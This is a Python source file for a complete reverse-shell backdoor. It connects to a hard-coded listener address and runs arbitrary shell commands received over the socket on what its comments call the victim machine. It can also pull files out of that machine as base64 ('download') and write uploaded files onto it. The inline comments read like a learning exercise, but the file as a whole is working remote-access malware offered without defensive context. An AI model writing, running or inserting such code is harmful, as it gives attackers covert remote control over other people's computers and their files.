import socket
import subprocess
import json
import os
import base64


class Backdoor:
    def __init__(self, ip, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # CREATES A SOCKET OBJECT.AF_INET STANDS FOR IPV4 AND SOCK_STREAM FOR TCP PACKET
        self.s.connect((ip, port))  # CONNECTION ESTABLISHMENT(3 WAY HANDSHAKE)

    def execute(self, command):
        try:
            return subprocess.check_output(command, shell=True, text=True)  # RETURNS THE OUTPUT OF SYSTEM COMMAND EXECUTED IN VICTIM MACHINE
        except subprocess.CalledProcessError:
            return "[+] Invalid command [+]"

    def send_json(self, data):
        json_data = json.dumps(data)  # CONVERT TCP STREAMS TO JSON DATA FOR RELIABLE TRANSFER FOR DATA
        self.s.send(json_data.encode())  # Encode to bytes before sending

    def recieve_json(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.s.recv(1024).decode()  # Decode bytes to string
                return json.loads(json_data)  # IT SENDS THE FULL FILE TILL THE END OF THE STRING/DAT
            except ValueError:
                continue

    def change_dir(self, path):
        try:
            os.chdir(path)
        except OSError:
            return "Invalid path"
        return "Changed directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:  # RB FOR READABLE BINRAY FILE
            return base64.b64encode(file.read()).decode()  # Decode bytes to string

    def write_file(self, path, content):
        with open(path, "wb") as file:  # WB FOR WRITTABLE BINARY FILE
            file.write(base64.b64decode(content))
            return "[+] Upload successful [+]"

    def run(self):
        while True:
            command = self.recieve_json()  # TRANFERING DATA IN CHUNKS.1024 IS THE BUFFER SIZE
            try:
                if command[0] == "exit":
                    self.s.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_output = self.change_dir(command[1])
                elif command[0] == "download":
                    command_output = self.read_file(command[1])
                elif command[0] == "upload":
                    command_output = self.write_file(command[1], command[2])
                else:
                    command_output = self.execute(command)  # CALLING THE FUNCTION WHICH RETURNS OUTPUT OF SYSTEM COMMAND
            except Exception:
                command_output = "[+] Error during execution of the command [+] "
            self.send_json(command_output)  # SENDS BACK THE OUTPUT TO LISTENER MACHINE


backdoor = Backdoor("10.0.1.37", 4443)
backdoor.run()
